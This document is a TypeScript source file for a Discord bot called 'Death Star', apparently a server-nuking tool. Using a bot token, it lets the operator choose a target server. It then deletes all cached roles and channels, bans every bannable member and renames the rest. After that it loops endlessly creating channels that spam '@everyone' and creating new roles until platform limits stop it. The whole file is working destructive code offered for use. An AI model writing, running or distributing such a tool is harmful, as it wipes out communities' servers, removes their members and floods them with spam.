import inquirer from "inquirer";
import logo from "asciiart-logo";
require("dotenv").config();

import config from "../package.json";
console.log(logo(config).render());

import { Client, Intents, Guild, Channel, Role } from "discord.js";
const client = new Client({ intents: [Intents.FLAGS.GUILDS] });

// const channelTypes = ["GUILD_CATEGORY", "GUILD_TEXT", "GUILD_VOICE"];
const message = "Death Star";

const destruction = async (guild: Guild) => {
  console.log("Staring procedure of destruction.");

  let roles = 0;
  guild.roles.cache.forEach((role: Role) => {
    roles++;
    role.delete(message).catch(console.error);
  });
  console.log(`Started deletion of ${roles} roles.`);

  let channels = 0;
  guild.channels.cache.forEach((channel: Channel) => {
    channels++;
    channel.delete().catch(console.error);
  });
  console.log(`Started deletion of ${channels} channels.`);

  let members = 0;
  guild.members.cache.forEach((member) => {
    if (member.bannable) {
      members++;
      member.ban({ days: 7, reason: message }).catch(console.error);
    } else {
      member.setNickname(message);
      console.log(`Member ${member.user.tag} not bannable.`);
    }
  });
  console.log(`Started banning ${members} members.`);

  console.log("Completed destruction procedure.");
};

const shitstorm = async (guild: Guild) => {
  console.log("Staring shitstorm procedure.");

  (async () => {
    let count = 0;
    while (true) {
      await guild.channels
        .create("death-star", {
          type: "GUILD_TEXT",
        })
        .then((channel: Channel) => {
          if (channel.isText()) {
            channel.send("Death Star is activated.");
            channel.send("@everyone");
          }
          console.log(`Death Star channel ${count} created.`);
        })
        .catch((error) => {
          switch (error.code) {
            case 50013:
              console.log("Missing permissions.");
              break;
            case 30013:
              console.log("Maximum number of server channels reached (500).");
              break;
            default:
              console.error(error);
              break;
          }
        });
      count++;
    }
  })();

  (async () => {
    let count = 0;
    while (true) {
      await guild.roles
        .create({
          name: "death-star",
          color: "#000000",
          reason: "Death Star is activated.",
        })
        .then((role) => {
          console.log(`Role ${count} created.`);
        })
        .catch((error) => {
          switch (error.code) {
            case 50013:
              console.log("Missing permissions.");
              break;
            case 10008:
              console.log("Maximum number of server roles reached (250).");
              break;
            default:
              console.error(error);
              break;
          }
        });
      count++;
    }
  })();
};

client.once("ready", async () => {
  console.log("Death Star is activated and ready to destroy.");
  const guilds = await client.guilds.cache.map((guild) => {
    return { name: guild.name, value: guild.id };
  });
  if (guilds.length === 0) {
    console.log("No guilds found.");
    return;
  }

  const target = await inquirer
    .prompt([
      {
        type: "list",
        name: "guild",
        message: "Select target:",
        default: guilds[0],
        choices: guilds,
        loop: true,
      },
    ])
    .then((answers) => answers.guild)
    .catch((error) => {
      if (error.isTtyError) {
        console.log("Prompt couldn't be rendered in the current environment");
      } else {
        console.error(error);
      }
    });

  console.log(target);
  const guild = client.guilds.cache.get(target);
  if (!guild) {
    console.error("No guild found.");
    return;
  }

  await destruction(guild);
  await shitstorm(guild);
});

client.login(process.env.DISCORD_TOKEN);
